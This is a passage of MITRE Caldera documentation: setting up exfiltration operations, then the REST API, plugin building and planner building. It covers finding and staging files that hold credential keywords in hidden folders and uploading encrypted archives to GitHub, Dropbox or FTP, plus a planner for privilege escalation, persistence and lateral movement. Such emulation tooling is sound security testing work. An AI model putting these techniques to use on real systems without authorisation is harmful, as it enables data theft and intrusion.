  #  value: CHANGEME-BOTH           <--- Uncomment & Update
  #- trait: github.repository.name
  #  value: CHANGEME-RepoOnly
  #- trait: github.repository.branch
  #  value: CHANGEME-RepoOnly
```

If you're planning a longer operation requiring other facts, feel free to add them to this file using the standard syntax.

## Adversaries

Before diving into an example, one last thing you should be aware of: pre-built adversaries. You may already be familiar
with adversaries like Hunter and Thief -- to give you a baseline, we've included four adversaries covering exfiltration
operations to Dropbox, FTP, and GitHub (1x Repository, 1x Gist). If you want to try them out quickly, simply create
the corresponding exfiltration destination account/service and run an operation as normal using 
Advanced Thief via \[ Dropbox | FTP | GitHub Repo | GitHub Gist \] and the provided fact source with appropriate entries.

These adversaries work nearly identically, first finding and staging files using Advanced File Search and Stager and
compressing the staged directory via utility with a password. Once converted to an archive, the last ability is exfil
to the selected destination.

## An Example

Let's walk through an example of exfiltrating a compressed archive to a GitHub repository. 

### Pre-Work: GitHub
First, ensure you have an account and that you have generated an access token as described above. In either the UI 
(github.com) or via the command line interface, create a repository to house the exfiltrated data. If desired, 
additionally create a branch. For this demo, we have selected 'caldera-exfil-test' as the repository and 'demo-op' as 
the branch. In the source file, edit the section marked for GitHub as follows. In the event you choose to use the main 
branch, supply that instead for the branch fact. 

```
id: 2ccb822c-088a-4664-8976-91be8879bc1d
name: Exfil Operation
...

  # GitHub Exfiltration
  # -------------------------------------
  - trait: github.user.name           # <--- Uncommented
    value: calderauser                # <--- Uncommented & Updated
  - trait: github.access.token        # <--- Uncommented
    value: ghp_dG90YWxseW1V1cG...     # <--- Uncommented & Updated
  - trait: github.repository.name     # <--- Uncommented
    value: caldera-exfil-test         # <--- Uncommented & Updated
  - trait: github.repository.branch   # <--- Uncommented
    value: demo-op                    # <--- Uncommented & Updated
...
```

### Operation Planning
With GitHub ready to go, it's time to consider other operational facts. For this example, we will focus on a quick
smash-and-grab without any other actions. Returning to the source file, let's look at the topic section for file search
and stage. While there are instructions in the file, we'll cover a little more detail here.

To summarize options, you can find files by: **extension** and **content** and cull the results by providing a variety
of limiters: **modified timeframe** (default: last 30 days) and/or **accessed timeframe** (default: last 30 days), only
searching certain directories (e.g. `c:\users` or `/home`) or explicitly excluding directories (e.g. any "Music" folders).
Additionally, for Windows targets you can exclude certain extensions. This is largely to exclude executables from capture
by the content search, which the Linux command can do inherently. The included source file has default values for many 
of these options but can easily be adjusted.

### Finding Content
Looking first at how to identify content we want, we'll discuss the extensions and content search. For extensions, you 
can control Windows and Linux separately to account for different important file types between the operating systems. For the 
extensions, you'll note instructions in the file regarding format. These extensions should be provided in a 
comma-separated list with no periods or asterisks as they are added in the payload. If you're not picky, you can also 
supply **all** or **none**.

The content search looks inside of files for the given string(s). This is shared between operating systems; simply include
your terms of import (spaces are ok!) in a comma-separated list. By default, Linux will ignore any binary files when
performing this search; Windows targets should use the excluded extensions list.

For this example, we'll leave the default values and be sure to exclude common binary files we might find from Windows.

```
...
  # ---- Comma-separated values, do not include '.' or '*', these are added in the payload if needed. Example: doc,docx
  # ---- May also use 'all' for INCLUDED extensions and 'none' for EXCLUDED extensions
  - trait: linux.included.extensions
    value: txt,cfg,conf,yml,doc,docx,xls,xlsx,pdf,sh,jpg,p7b,p7s,p7r,p12,pfx
  - trait: windows.included.extensions
    value: doc,xps,xls,ppt,pps,wps,wpd,ods,odt,lwp,jtd,pdf,zip,rar,docx,url,xlsx,pptx,ppsx,pst,ost,jpg,txt,lnk,p7b,p7s,p7r,p12,pfx
  - trait: windows.excluded.extensions # Mainly used to avoid binary files during content search, not needed for Linux
    value: exe,jar,dll,msi,bak,vmx,vmdx,vmdk,lck
    
  # ---- Comma-separated values to look for. Spaces are allowed in terms. May also use 'none'
  - trait: file.sensitive.content
    value: user,pass,username,password,uname,psw
...
```

### Limiting our results
With the content identified, we may want to focus our efforts on areas that might contain sensitive documents to save
time in the operation and post-processing. Adversaries have been observed using similar tactics, limiting results
to certain directories or documents seeing use in a given time period. As with the extensions and content, the provided 
source file has default values set, but they can easily be changed.

First, you can choose an information cutoff date. As with the extensions, you can specify 'none' if you do not wish to
limit the results. You can also pick one or the other (modified or accessed) if you only care about one metric. Simply
supply a negative integer value, which represents the number of past days from today to include. We'll leave it with 
the default here.

```
  # ---- Integer; cutoff for access/modification (-30 = accessed/modified in last 30 days)
  # ---- May also use 'none' for either or both options. Note on usage: if both options are present, the script
  # ---- uses a boolean "or" - if a file was accessed in the desired timeframe but not modified in the time frame,
  # ---- it will still be collected. If modification is more important, set accessed time to "none".
  - trait: file.last.accessed
    value: -30
  - trait: file.last.modified
    value: -30
```

Next, let's look at the directories. You can again supply comma-separated lists of directories or a single directory. These
items will be used as the root nodes for a recursive search within. The default is `c:\users` and `/home`, but we have
changed things up here to limit it to a folder containing test files.

```
  # ---- Comma-separated, full paths to base folders (will recurse inside)
  - trait: windows.included.directories
    value: c:\caldera-test-files
  - trait: linux.included.directories
    value: /caldera-test-files
```

If searching a directory like `c:\users` or `/home`, you will likely encounter folders you (or an attacker) do not much
care for. To address this, you can supply a comma-separated list of **phrases** to exclude from directory paths. These
**do not** need to be full paths and **can** include spaces. For the example below, we have excluded things like "Music"
and "saved games", folders found by default in user directories. Because these folders aren't likely in the test folder
we're using, these shouldn't be issues. Be sure to account for any folders that may contain information that would
violate your organization's policy if it were to be published to a site outside of organizational control.

```
  # ----  Comma-separated, does not need to be full paths. May also use 'none'
  - trait: windows.excluded.directories
    value: links,music,saved games,contacts,videos,source,onedrive
  - trait: linux.excluded.directories
    value: .local,.cache,lib
```

### Staging
Next up, we'll discuss staging. Because this file does search _and_ stage, users can specify where to move the files.
By default, Windows targets will stage to the user's recycle bin and Linux targets will stage to /tmp as both of these
locations should be writable by default. In each case, the ability will create a _hidden_ folder called "s" at these
locations.

If changing the default location, be sure to include a **full path**. Because the Recycle Bin requires some processing
to get the user's SID, you can instead use the string "Recycle Bin" which will be parsed into the correct location. As
noted in the instructions, if the staging directory is changed from the default, the ability does contain a fall-back
in the event the selected directory is not writable. These values are `c:\users\public` and `/tmp`.

```
  # Include the full path or use "Recycle Bin". Fall-back in the payload file is "c:\users\public".
  # Recycle Bin will attempt to create a staging folder at c:\$Recycle.Bin\{SID} which should be writable by default
  # Takes given location and creates a hidden folder called 's' at the location.
  - trait: windows.staging.location
    value: Recycle Bin

  # ---- Include the full path, ensure it's writable for the agent. Fallback is /tmp. Creates a hidden folder called .s
  - trait: linux.staging.location
    value: /tmp
```

To support safe testing, the ability additionally has a **safe mode** option. It is **disabled by default** and will
find all files matching the parameters set before. If this fact is changed to 'true', you can supply an identifying value
which indicates the file is for testing. This identifying value **must be at the end** of the file. The
default value is "_pseudo". If Safe Mode is enabled, Caldera **will not** stage any files that do not end in "_pseudo".

To provide a few examples, if safe mode is on with the value "_pseudo":

- `interesting_file.docx` -- matches the requested extension -- **will not be staged**
- `interesting_content.txt` -- matches the requested content -- **will not be staged**
- `interesting_pseudo_data.doc` -- matches the requested content -- **will not be staged** because "_pseudo" is in the wrong place
- `uninteresting_file_pseudo.random` -- doesn't match the requested extension -- **will not be staged** despite the "_pseudo"
- `interesting_file_pseudo.docx` -- matches the requested extension -- **will be staged**
- `interesting_content_pseudo.txt` -- that matches the requested content -- **will be staged**

```
  # ---- Safe Mode - Only stages files with the appropriate file ending if enabled (e.g. report_pseudo.docx)
  - trait: safe.mode.enabled
    value: false
  - trait: pseudo.data.identifier
    value: _pseudo
```

### Final Piece: A Password
For this demonstration, we will be using the password-protected archive ability added in this update. The source contains
a default value of C4ld3ra but can be changed to anything if more security is required (e.g., real files used in testing).
As noted in the source file, certain special characters may be escaped when inserted into the command. This may result
in a different password than what you entered - view the operation logs to see exactly what was used. You should still
be able to decrypt the archive, but will need to include any escape characters added during the operation. For example,
`Pa$$word` may have become `Pa\$\$word` or ```Pa`$`$word```.

```
  # Encrypted Compression
  # Note: For passwords with special characters like # and $, you may need to include escapes (\ or `)
  # when re-entering the password to decrypt the archive. Examine the operation output to see the exact password used.
  # If using special characters, put the password in 'single quotes' here to prevent parser errors.
  # -------------------------------------
  - trait: host.archive.password
    value: C4ld3ra
```

## Operation
Whew. Let's recap a few things. So far we have:
1. Set up a GitHub repository and branch to receive the exfiltrated files, using a personal access token
2. Updated the selected source file with the pertinent information about the GitHub account and ensured the lines are uncommented
3. Adjusted and reviewed the source file for the files we want to find and exclude, provided a staging location, and provided a password

With all of that in place, fire up Caldera as normal. For this demonstration, we'll use a pre-built adversary, but you
can easily add other abilities (even multi-exfil paths) to your own adversary or operation.

Navigate to the Operations tab and hit "Create an Operation". Fill in the name, select "Advanced Thief via GitHub Repo"
as the adversary, and finally select the source file ("Exfil Operation" if using the supplied file) containing the facts
we set up earlier. Adjust any settings under Advanced if desired, otherwise start the operation. The agent should
collect the requested files in the staging directory, compress them, and POST the files to the desired repository/branch.
The filename will be a timestamp (YYYYMMDDHHmmss), exfil, the agent's paw, and the original file name.

In our demonstration, refreshing the repository shows the following: 20211112094022-exfil-gwsnys-s.tar.gz.gpg. This
file could then be downloaded an decrypted with the default password.

Operation cleanup should remove the compressed archive and the staging directory (+ contents). This cleanup does not occur until the operation is terminated, so you could add another exfiltration (e.g. to Dropbox) in the interim.

## Wrap-up
That about does it! If you have any questions, please reach out to the team on Slack.


# The REST API

```{warning}
The original REST API has been deprecated. The new REST API v2 documentation can be found in the CORE SYSTEM API section or by scrolling to the bottom of the Caldera navigation menu and selecting "api docs."
```

### /api/rest

You can interact with all parts of Caldera through the core REST API endpoint /api/rest. If you
send requests to "localhost" - you are not required to pass a key header. If you send requests to
127.0.0.1 or any other IP addresses, the key header is required. You can set the API key in the 
conf/default.yml file. Some examples below will use the header, others will not, for example.

> Any request to this endpoint must include an "index" as part of the request, which routes it to the appropriate object type. 

Here are the available REST API functions:

## Agents

#### DELETE

Delete any agent. 
```
curl -H "KEY:$API_KEY" -X DELETE http://localhost:8888/api/rest -d '{"index":"agents","paw":"$agent_paw"}'
```

#### POST

View the abilities a given agent could execute.
```
curl -H "KEY:$API_KEY" -X POST localhost:8888/plugin/access/abilities -d '{"paw":"$PAW"}'
```

Execute a given ability against an agent, outside the scope of an operation. 
```
curl -H "KEY:$API_KEY" -X POST localhost:8888/plugin/access/exploit -d '{"paw":"$PAW","ability_id":"$ABILITY_ID","obfuscator":"plain-text"}'
```
> You can optionally POST an obfuscator and/or a facts dictionary with key/value pairs to fill in any variables the chosen ability requires.
```
{"paw":"$PAW","ability_id":"$ABILITY_ID","obfuscator":"base64","facts":[{"trait":"username","value":"admin"},{"trait":"password", "value":"123"}]}
```

## Adversaries

View all abilities for a specific adversary_id (the UUID of the adversary).
```
curl -H "KEY:$API_KEY" 'http://localhost:8888/api/rest' -H 'Content-Type: application/json' -d '{"index":"adversaries","adversary_id":"$adversary_id"}'
```

View all abilities for all adversaries.
```
curl -H "KEY:$API_KEY" 'http://localhost:8888/api/rest' -H 'Content-Type: application/json' -d '{"index":"adversaries"}'
```

## Operations

#### DELETE

Delete any operation. Operation ID must be a integer.
```bash
curl -H "KEY:$API_KEY" -X DELETE http://localhost:8888/api/rest -d '{"index":"operations","id":"$operation_id"}'
```

#### POST

Change the state of any operation. In addition to finished, you can also use: paused, run_one_link or running.
```bash
curl -X POST -H "KEY:$API_KEY" http://localhost:8888/api/rest -d '{"index":"operation", "op_id":123, "state":"finished"}'
```

#### PUT

Create a new operation. All that is required is the operation name, similar to creating a new operation
in the browser.
```bash
curl -X PUT -H "KEY:$API_KEY" http://127.0.0.1:8888/api/rest -d '{"index":"operations","name":"testoperation1"}'
```
Optionally, you can include:

1) group (defaults to empty string)
2) adversary_id (defaults to empty string)
3) planner (defaults to *batch*)
4) source (defaults to *basic*')
5) jitter (defaults to *2/8*)
6) obfuscator (defaults to *plain-text*)
7) visibility (defaults to *50*)
8) autonomous (defaults to *1*)
9) phases_enabled (defaults to *1*)
10) auto_close (defaults to *0*)

To learn more about these options, read the "What is an operation?" documentation section.           

## /file/upload

Files can be uploaded to Caldera by POST'ing a file to the /file/upload endpoint. Uploaded files will be put in the exfil_dir location specified in the default.yml file.

#### Example
```bash
curl -F 'data=@path/to/file' http://localhost:8888/file/upload
```

## /file/download

Files can be downloaded from Caldera through the /file/download endpoint. This endpoint requires an HTTP header called "file" with the file name as the value. When a file is requested, Caldera will look inside each of the payload directories listed in the local.yml file until it finds a file matching the name.

Files can also be downloaded indirectly through the [payload block of an ability](Learning-the-terminology.md).

> Additionally, the [Sandcat plugin](Plugin-library.md) delivery commands utilize the file download endpoint to drop the agent on a host

#### Example
```bash
curl -X POST -H "file:wifi.sh" http://localhost:8888/file/download > wifi.sh
```

# How to Build Plugins

Building your own plugin allows you to add custom functionality to Caldera. 

A plugin can be nearly anything, from a RAT/agent (like Sandcat) to a new GUI or a collection of abilities that you want to keep in "closed-source". 

Plugins are stored in the plugins directory. If a plugin is also listed in the local.yml file, it will be loaded into Caldera each time the server starts. A plugin is loaded through its hook.py file, which is "hooked" into the core system via the server.py (main) module.

> When constructing your own plugins, you should avoid importing modules from the core code base, as these can change. 
> There are two exceptions to this rule
> 1. The services dict() passed to each plugin can be used freely. Only utilize the public functions on these services 
> however. These functions will be defined on the services' corresponding interface.
> 2. Any c_object that implements the FirstClassObjectInterface. Only call the functions on this interface, as the others
> are subject to changing.

This guide is useful as it covers how to create a simple plugin from scratch. 
However, if this is old news to you and you're looking for an even faster start, 
consider trying out [Skeleton](https://github.com/mitre/skeleton)
(a plugin for building other plugins). 
Skeleton will generate a new plugin directory that contains all the standard
boilerplate. 

## Creating the structure

Start by creating a new directory called "abilities" in Caldera's plugins directory. In this directory, create a hook.py file and ensure it looks like this:
```python
name = 'Abilities'
description = 'A sample plugin for demonstration purposes'
address = None


async def enable(services):
    pass
```

The name should always be a single word, the description a phrase, and the address should be None, unless your plugin exposes new GUI pages. Our example plugin will be called "abilities".

## The _enable_ function

The enable function is what gets hooked into Caldera at boot time. This function accepts one parameter:

1. **services**: a list of core services that Caldera creates at boot time, which allow you to interact with the core system in a safe manner. 

Core services can be found in the app/services directory.

## Writing the code

Now it's time to fill in your own enable function. Let's start by appending a new REST API endpoint to the server. When this endpoint is hit, we will direct the request to a new class (AbilityFetcher) and function (get_abilities). The full hook.py file now looks like:
```python
from aiohttp import web

name = 'Abilities'
description = 'A sample plugin for demonstration purposes'
address = None


async def enable(services):
    app = services.get('app_svc').application
    fetcher = AbilityFetcher(services)
    app.router.add_route('*', '/get/abilities', fetcher.get_abilities)


class AbilityFetcher:

    def __init__(self, services):
        self.services = services

    async def get_abilities(self, request):
        abilities = await self.services.get('data_svc').locate('abilities')
        return web.json_response(dict(abilities=[a.display for a in abilities]))
```

Now that our initialize function is filled in, let's add the plugin to the default.yml file and restart Caldera. Once running, in a browser or via cURL, navigate to 127.0.0.1:8888/get/abilities. If all worked, you should get a JSON response back, with all the abilities within Caldera. 

## Making it visual

Now we have a usable plugin, but we want to make it more visually appealing. 

Start by creating a "templates" directory inside your plugin directory (abilities). Inside the templates directory, create a new file called abilities.html. Ensure the content looks like:
```html
<div id="abilities-new-section" class="section-profile">
    <div class="row">
        <div class="topleft duk-icon"><img onclick="removeSection('abilities-new-section')" src="/gui/img/x.png"></div>
        <div class="column section-border" style="flex:25%;text-align:left;padding:15px;">
            <h1 style="font-size:70px;margin-top:-20px;">Abilities</h1>
        </div>
        <div class="column" style="flex:75%;padding:15px;text-align: left">
            <div>
                {% for a in abilities %}
                    <pre style="color:grey">{{ a }}</pre>
                    <hr>
                {% endfor %}
            </div>
        </div>
    </div>
</div>
```

Then, back in your hook.py file, let's fill in the address variable and ensure we return the new abilities.html page when a user requests 127.0.0.1/get/abilities. Here is the full hook.py:

```python
from aiohttp_jinja2 import template, web

from app.service.auth_svc import check_authorization

name = 'Abilities'
description = 'A sample plugin for demonstration purposes'
address = '/plugin/abilities/gui'


async def enable(services):
    app = services.get('app_svc').application
    fetcher = AbilityFetcher(services)
    app.router.add_route('*', '/plugin/abilities/gui', fetcher.splash)
    app.router.add_route('GET', '/get/abilities', fetcher.get_abilities)


class AbilityFetcher:
    def __init__(self, services):
        self.services = services
        self.auth_svc = services.get('auth_svc')

    async def get_abilities(self, request):
        abilities = await self.services.get('data_svc').locate('abilities')
        return web.json_response(dict(abilities=[a.display for a in abilities]))

    @check_authorization
    @template('abilities.html')
    async def splash(self, request):
        abilities = await self.services.get('data_svc').locate('abilities')
        return(dict(abilities=[a.display for a in abilities]))

```
Restart Caldera and navigate to the home page. Be sure to run ```server.py```
with the ```--fresh``` flag to flush the previous object store database. 

You should see a new "abilities" tab at the top, clicking on this should navigate you to the new abilities.html page you created. 

## Adding documentation

Any Markdown or reStructured text in the plugin's `docs/` directory will appear in the documentation generated by the fieldmanual plugin. Any resources, such as images and videos, will be added as well.

# How to Build Planners

For any desired planner decision logic not encapsulated in the default _batch_ planner (or any other existing planner), Caldera requires that a new planner be implemented to encode such decision logic.

## Buckets

The cornerstone of how planners make decisions is centered on a concept we call 'buckets'. Buckets denote the planner's state machine and are intended to correspond to _buckets_ of Caldera abilities. Within a planner, macro level decision control is encoded by specifying which buckets (i.e. states) follow other buckets, thus forming a bucket state machine. Micro level decisions are made within the buckets, by specifying any logic detailing which abilities to send to agents and when to do so.

Caldera abilities are also tagged by the buckets they are in. By default, when abilities are loaded by Caldera, they are tagged with the bucket of the ATT&CK technique they belong to. Caldera abilities can also be tagged/untagged at will by any planner as well, before starting the operation or at any point in it. The intent is for buckets to work with the abilities that have been tagged for that bucket, but this is by no means enforced.

## Creating a Planner

Let's dive into creating a planner to see the power and flexibility of the Caldera planner component. For this example, we will implement a planner that will carry out the following state machine:

![privileged persistence sm screenshot](img/privileged_persistence_state_machine.png)

The planner will consist of 5 buckets:  _Privilege Escalation_, _Collection_, _Persistence_, _Discovery_, and _Lateral Movement_. As implied by the state machine, this planner will use the underlying adversary abilities to attempt to spread to as many hosts as possible and establish persistence. As an additional feature, if an agent cannot obtain persistence due to unsuccessful privilege escalation attempts, then the agent will execute collection abilities immediately in case it loses access to the host.

This document will walk through creating three basic components of a planner module (initialization, entrypoint method, and bucket methods), creating the planner data object, and applying the planner to a new operation.  

### Creating the Python Module 

We will create a python module called `privileged_persistence.py` and nest it under `app/` in the `mitre/stockpile` plugin at `plugins/stockpile/app/privileged_persistence.py`. 

**_First, lets build the static initialization of the planner:_**

```python
class LogicalPlanner:

    def __init__(self, operation, planning_svc, stopping_conditions=()):
        self.operation = operation
        self.planning_svc = planning_svc
        self.stopping_conditions = stopping_conditions
        self.stopping_condition_met = False
        self.state_machine = ['privilege_escalation', 'persistence', 'collection', 'discovery', 'lateral_movement']
        self.next_bucket = 'privilege_escalation'
```

Look closer at these lines:

```python
    def __init__(self, operation, planning_svc, stopping_conditions=()):
        self.operation = operation
        self.planning_svc = planning_svc
        self.stopping_conditions = stopping_conditions
        self.stopping_condition_met = False
```

The `__init__()` method for a planner must take and store the required arguments for the `operation` instance, `planning_svc` handle, and any supplied `stopping_conditions`.
 
Additionally, `self.stopping_condition_met`, which is used to control when to stop bucket execution, is initially set to `False`. During bucket execution, this property will be set to `True` if any facts gathered by the operation exactly match (both name and value) any of the facts provided in `stopping_conditions`. When this occurs, the operation will stop running new abilities.

```python
        self.state_machine = ['privilege_escalation', 'persistence', 'collection', 'discovery', 'lateral_movement']
```

The `self.state_machine` variable is an optional list enumerating the base line order of the planner state machine. This ordered list **_does not_** control the bucket execution order, but is used to define a base line state machine that we can refer back to in our decision logic. This will be demonstrated in our example below when we create the bucket methods.

```python
        self.next_bucket = 'privilege_escalation'
```

The `self.next_bucket` variable holds the next bucket to be executed. This is the next bucket that the planner will enter and whose bucket method will next control the planning logic. Initially, we set `self.next_bucket` to the first bucket the planner will begin in. We will modify `self.next_bucket` from within our bucket methods in order to specify the next bucket to execute.

_Additional Planner class variables_

It is also important to note that a planner may define any required variables that it may need. For instance, many custom planners require information to be passed from one bucket to another during execution. This can be done by creating class variables to store information which can be accessed within any bucket method and will persist between bucket transitions.

**_Now, lets the define the planner's entrypoint method: `execute`_**

```python
    async def execute(self):
        await self.planning_svc.execute_planner(self)
```

`execute` is where the planner starts and where any runtime initialization is done. `execute_planner` works by executing the bucket specified by `self.next_bucket` until the `self.stopping_condition_met` variable is set to True. For our planner, no further runtime initialization is required in the `execute` method.

**_Finally, lets create our bucket methods:_**

```python
    async def privilege_escalation(self):
        ability_links = await self.planning_svc.get_links(self.operation, buckets=['privilege escalation'])
        paw = ability_links[0].paw if ability_links else None
        link_ids = [await self.operation.apply(l) for l in ability_links]
        await self.operation.wait_for_links_completion(link_ids)
        successful = self.operation.has_fact('{}.privilege.root'.format(paw), True) or self.operation.has_fact('{}.privilege.admin'.format(paw), True)
        if successful:
            self.next_bucket = 'persistence'
        else:
            self.next_bucket = 'collection'

    async def persistence(self):
        await self.planning_svc.exhaust_bucket(self, 'persistence', self.operation)
        self.next_bucket = await self.planning_svc.default_next_bucket('persistence', self.state_machine)

    async def collection(self):
        await self.planning_svc.exhaust_bucket(self, 'collection', self.operation)
        self.next_bucket = 'discovery'

    async def discovery(self):
        await self.planning_svc.exhaust_bucket(self, 'discovery', self.operation)
        lateral_movement_unlocked = bool(len(await self.planning_svc.get_links(self.operation, buckets=['lateral_movement'])))
        if lateral_movement_unlocked:
            self.next_bucket = await self.planning_svc.default_next_bucket('discovery', self.state_machine)
        else:
            # planner will transition from this bucket to being done
            self.next_bucket = None

    async def lateral_movement(self):
        await self.planning_svc.exhaust_bucket(self, 'lateral_movement', self.operation)
        self.next_bucket = 'privilege_escalation'
```

These bucket methods are where all inter-bucket transitions and intra-bucket logic will be encoded. For every bucket in our planner state machine, we must define a corresponding bucket method.

Lets look at each of the bucket methods in detail:

* `privilege_escalation()` - We first use `get_links` planning service utility to retrieve all abilities (links) tagged as _privilege escalation_ from the operation adversary. We then push these links to the agent with `apply` and wait for these links to complete with `wait_for_links_completion()`, both from the operation utility. After the links complete, we check for the creation of custom facts that indicate the privilege escalation was successful (Note: this assumes the privilege escalation abilities we are using create custom facts in the format "{paw}.privilege.root" or "{paw}.privilege.admin" with values of `True` or `False`). If privilege escalation was successful, set the next bucket to be executed to _persistence_, otherwise _collection_.
* `persistence()`, `collection()`, `lateral_movement()` - These buckets have no complex logic, we just want to execute all links available and are tagged for the given bucket. We can use the `exhaust_bucket()` planning service utility to apply all links for the given bucket tag. Before exiting, we set the next bucket as desired. Note that in the `persistence()` bucket we use the `default_next_bucket()` planning service utility, which will automatically choose the next bucket after "persistence" in the provided `self.state_machine` ordered list.
* `discovery()` - This bucket starts by running all _discovery_ ability links available. Then we utilize a useful trick to determine if the planner should proceed to the _lateral movement_ bucket. We use `get_links()` to determine if the _discovery_ links that were just executed ended up unlocking ability links for _lateral movement_. From there we set the next bucket accordingly.

**_Additional Notes on Privileged Persistence Planner_**

- You may have noticed that the _privileged_persistence_ planner is only notionally more sophisticated than running certain default adversary profiles. This is correct. If you can find or create an adversary profile whose ability enumeration (i.e. order) can carry out your desired operational progression between abilities and can be executed in batch (by the default _batch_ planner) or in a sequentially atomic order (by _atomic_ planner), it is advised to go that route. However, any decision logic above those simple planners will have to be implemented in a new planner.
- The _privileged persistence_ planner did not have explicit logic to handle multiple agents. We just assumed the planner buckets would only have to handle a single active agent given the available ability links returned from the planning service. 

### Creating the Planner Object

In order to use this planner inside Caldera, we will create the following YAML file at `plugins/stockpile/data/planners/80efdb6c-bb82-4f16-92ae-6f9d855bfb0e.yml`:

```yaml
---

id: 80efdb6c-bb82-4f16-92ae-6f9d855bfb0e
name: privileged_persistence
description: |
  Privileged Persistence Planner: Attempt to spread to as many hosts as possible and establish persistence.
  If privilege escalation attempts succeed, establish persistence. Then, collect data.
module: plugins.stockpile.app.privileged_persistence
params: {}
ignore_enforcement_modules: []
```

This will create a planner in Caldera which will call the module we've created at `plugins.stockpile.app.privileged_persistence`.

*NOTE: For planners intended to be used with profiles containing repeatable abilities, `allow_repeatable_abilities: True` must be added to the planner YAML file. Otherwise, Caldera will default the value to `False` and assume the planner does not support repeatable abilities.* 

### Using the Planner

To use the planner, create an Operation and select the "Use privileged_persistence planner" option in the planner dropdown (under Autonomous). Any selected planner will use the abilities in the selected adversary profile during the operation. Since abilities are automatically added to buckets which correlate to MITRE ATT&CK tactics, any abilities with the following tactics will be executed by the privileged_persistence planner: _privilege_escalation_, _persistence_, _collection_, _discovery_, and _lateral_movement_.

## A Minimal Planner

Custom planners do not have to use the buckets approach to work with the Caldera operation interface if not desired. Here is a minimal planner that will still work with the operation interface.

```python

class LogicalPlanner:

    def __init__(self, operation, planning_svc, stopping_conditions=()):
        self.operation = operation
        self.planning_svc = planning_svc
        self.stopping_conditions = stopping_conditions
        self.stopping_condition_met = False

    async def execute(self):
        #
        # Implement Planner Logic
        #
        return
```

## Advanced Fact Usage

In addition to the basic (name, value) information present in facts and documented in [Basic Usage](Basic-Usage.md#facts), there are some additional fields that may prove useful when developing and working with planners.

#### Fact Origins

As of Caldera v4.0, facts now have the new `origin_type` and `source` fields, which identify how Caldera learned that fact. There are 5 possible values for the `origin_type` field:
* DOMAIN - This fact originates from Caldera's general knowledge about environments
* SEEDED - This fact originates from a source file, which was used to seed an operation
* LEARNED - This fact originates from an operation, which uncovered it
* IMPORTED - This fact originates from a previous operation, or another pre-existing fact collection
* USER - This fact originates from a User, i.e. was entered through the GUI

The `source` field, on the other hand, contains a UUID4 that corresponds to the originating object described by `origin_type`.

#### Fact Links/Relationships

As of Caldera v4.0, facts also now have new fields in them that track the Links and Relationships that have contributed to that fact in some way, accessible as `links` and `relationships` respectively. Each of these properties is a list of corresponding objects, with `links` corresponding to all Link objects that generated/identified this Fact, and `relationships` corresponding to all Relationship objects that reference this Fact.

#### Fact Score

One potentially useful Fact property for planners is the `score` property. This tracks how many times a fact has been used successfully in links, allowing facts to have an inherent 'weight' to them when they are useful. Facts start with a score of 1, a value that typically increases by 1 every time a link uses it (though scores can be increased or decreased by varying amounts by other means). For context, a link's score, when generated by Caldera's core planning services, is simply the sum of the scores of the facts utilized by that link.


## Planning Service Utilities

Within a planner, these utilities are available from `self.planning_svc`:

* `exhaust_bucket()` - Apply all links for specified bucket. Blocks execution until all links are completed, either after batch push, or separately for every pushed link. Allows a single agent to be specified.
* `execute_links()` - Wait for links to complete and update stopping conditions.
* `default_next_bucket()` - Returns next bucket as specified in the given state machine. If the current bucket is the last in the list, the bucket order loops from last bucket to first. Used in the above example to advance to the next bucket in the persistence and discovery buckets.
* `add_ability_to_next_bucket()` - Applies a custom bucket to an ability. This can be used to organize abilities into buckets that aren't standard MITRE ATT&CK tactics.
* `execute_planner()` - Executes the default planner execution flow, progressing from bucket to bucket. Execution will stop if: all buckets have been executed (`self.next_bucket` is set to `None`), planner stopping conditions have been met, or the operation is halted.
* `get_links()` - For an operation and agent combination, create links (that can be executed). When no agent is supplied, links for all agents in an operation are returned. Uses `operation.all_facts()` to determine if an ability has been unlocked. Used in the above example in the discovery bucket to determine if any lateral movement abilities have been unlocked.
* `get_cleanup_links()` - Generates cleanup links for a given operation, to be run when a operation is completed.
* `generate_and_trim_links()` - Creates new links based on provided operation, agent, and abilities. Optionally, trim links using `trim_links()` to return only valid links with completed facts. Facts are selected from the operation using `operation.all_facts()`.
* `check_stopping_conditions()` - Checks the collected operation facts against the stopping conditions set by the planner.
* `update_stopping_condition_met()` - Update a planner's `stopping_condition_met` property with the results of `check_stopping_conditions()`. 


## Operation Utilities

Within a planner, all public utilities are available from `self.operation`. The following may assist in planner development:

* `apply()` - Add a link to the operation.
* `wait_for_links_completion()` - Wait for started links to be completed.
* `all_facts()` - Return a list of all facts collected during an operation. These will include both learned and seeded (from the operation source) facts.
* `has_fact()` - Search an operation for a fact with a particular name and value.
* `all_relationships()` - Return a list of all relationships collected during an operation.
* `active_agents()` - Find all agents in the operation that have been active since operation start.

## Knowledge Service

As of Caldera V4.0, a new service has been added to the core of Caldera for use with planners and other components that make use of facts: the Knowledge Service. This service allows the creation, retrieval, updating, and deletion of facts, relationships, and rules.
Typically, users should not need to interact with this service directly, as common usage patterns are already baked into core objects such as `Link`, `Agent`, and `Operation`, but the service can be accessed by using `BaseService.get_service('knowledge_svc')`, should the need arise for more complex interactions with the available data.
The Knowledge Service stores data persistently in the same manner that Caldera's internal Data Service does (by writing it to a file on shutdown), and can be cleared in much the same way if necessary (by using the `--fresh` argument on the server).

The following methods are available from the Knowledge Service:
```python
app.objects.secondclass.c_fact
```
* `KnowledgeService.add_fact(fact)` - Add a fact to the Knowledge Service's datastore. The `fact` argument must be an already instantiated `Fact()` object.
* `KnowledgeService.delete_fact(criteria)` - Remove matching facts from the datastore. The `criteria` argument should be a dictionary with fields to match existing facts against for selection.
* `KnowledgeService.get_facts(criteria)` - Retrieve matching facts from the datastore. The `criteria` argument should be a dictionary with fields to match existing facts against for selection.
* `KnowledgeService.update_fact(criteria, updates)` - Update an existing fact in the datastore. The `criteria` argument should be a dictionary with fields to match existing facts against for selection, and `updates` should be a dictionary with fields to change and their new values.
* `KnowledgeService.get_fact_origin(fact)` - Identifies the location/source of a provided fact. The `fact` argument can be either a name to search for or a full blown Fact object. The return is a tuple of the ID corresponding to the origin object for this fact, and the type of origin object.

```python 
app.objects.secondclass.c_relationship
```
* `KnowledgeService.add_relationship(relationship)` - Add a relationship to the datastore. The `relationship` argument must be an already instantiated `Relationship()` object.
* `KnowledgeService.delete_relationship(criteria)` - Remove a relationship from the datastore. The `criteria` argument should be a dictionary containing fields to match relationships against.
* `KnowledgeService.get_relationships(criteria)` - Retrieve a relationship from the datastore. The `criteria` argument should be a dictionary containing fields to match relationships against, and can contain further dictionaries to match facts in relationships against.
